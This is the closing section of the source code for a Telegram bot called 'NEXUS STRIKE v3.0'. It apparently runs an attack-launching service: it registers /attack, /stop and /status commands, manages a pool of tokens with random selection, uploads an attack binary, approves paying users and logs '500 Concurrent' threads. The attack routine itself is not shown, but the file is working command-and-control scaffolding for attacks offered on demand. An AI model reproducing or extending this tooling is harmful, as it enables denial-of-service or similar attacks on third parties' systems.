                "<i>Get ready for the heat.</i>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_start")]])
            )
        elif data == "status":
            await status_cmd(update, context)
        elif data == "stop":
            await stop_cmd(update, context)
        elif data == "refresh_status":
            await status_cmd(update, context)
        elif data == "back_start":
            await start_cmd(update, context)
        elif data == "admin_panel" and is_owner(user_id):
            keyboard = [
                [InlineKeyboardButton("🔑 Tokens", callback_data="admin_tokens")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
                [InlineKeyboardButton("⏳ Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("📤 Binary", callback_data="admin_binary")],
                [InlineKeyboardButton("🧹 Check Tokens", callback_data="admin_checktokens")],
                [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
            ]
            await query.edit_message_text("🔧 <b>Admin Console</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        elif data == "admin_tokens":
            await tokens_cmd(update, context)
        elif data == "admin_users":
            await users_cmd(update, context)
        elif data == "admin_pending":
            await pending_cmd(update, context)
        elif data == "admin_binary":
            await query.edit_message_text("📤 Use <code>/binary_upload</code>", parse_mode='HTML')
        elif data == "admin_checktokens":
            await checktokens_cmd(update, context)
        else:
            await query.edit_message_text("❓ Unknown command.", parse_mode='HTML')
    except Exception as e:
        logger.error(f"Callback error: {e}")
        try:
            await query.edit_message_text(f"⚠️ Error: {str(e)[:100]}", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== ERROR =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("⚠️ System glitch. Check logs.", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("binary_upload", binary_upload_start)],
            states={WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, binary_upload_receive), CommandHandler("cancel", binary_upload_cancel)]},
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv_handler)

        app.add_handler(CommandHandler("start", start_cmd))
        app.add_handler(CommandHandler("attack", attack_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("stop", stop_cmd))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))
        app.add_handler(CommandHandler("about", about_cmd))

        app.add_handler(CommandHandler("addtoken", addtoken_cmd))
        app.add_handler(CommandHandler("removetoken", removetoken_cmd))
        app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
        app.add_handler(CommandHandler("checktokens", checktokens_cmd))
        app.add_handler(CommandHandler("tokens", tokens_cmd))
        app.add_handler(CommandHandler("approve", approve_cmd))
        app.add_handler(CommandHandler("remove", removeuser_cmd))
        app.add_handler(CommandHandler("users", users_cmd))
        app.add_handler(CommandHandler("pending", pending_cmd))
        app.add_handler(CommandHandler("broadcast", broadcast_cmd))
        app.add_handler(CommandHandler("maintenance", maintenance_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("⎈ NEXUS STRIKE v3.0 is ONLINE!")
        logger.info("⚙️ 5 Runners × 100 Threads = 500 Concurrent")
        logger.info("🎲 Random Token Selection Active")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
